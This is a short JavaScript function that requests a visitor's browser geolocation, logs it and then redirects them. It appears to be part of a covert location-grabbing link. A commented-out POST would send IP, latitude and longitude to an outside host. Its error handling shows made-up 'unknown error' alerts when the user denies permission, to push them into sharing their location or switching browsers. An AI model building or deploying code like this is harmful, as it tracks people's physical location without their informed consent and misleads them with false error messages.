function recordLoc() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
            console.log(position.coords);

            // $.post( "https://techwizmatt.info/api/loc-fetch/record.php", { ip:'',lat:'',long:'' }, function( data ) {
            // //    Post is complete fully redirect!
            // });

            setTimeout(function(){
                window.location.replace($('#loadUrl').attr('src'));
            }, 1000);
        }, error =>{
            switch (error.code) {
                case error.PERMISSION_DENIED:
                    console.log("The user has denied user loc, Looking like they read the message");
                    break;
                case error.POSITION_UNAVAILABLE:
                    console.log("The location is currently unavailable, Let's reload the page and try again.");
                    break;
                case error.TIMEOUT:
                    console.log("The location fetch has timed out, Let's reload the page and try again.");
                    break;
                case error.UNKNOWN_ERR:
                    alert('a Unknown error has occurred. Please try again later.');
                    console.log("Unknown error");
                    break;
            }
        });
    } else {
        console.log("Location fetch is not available with this device. Let's inform the user of a standard error.");
        alert("a Unknown error has occurred. Please use a different browser to continue.");
    }
}

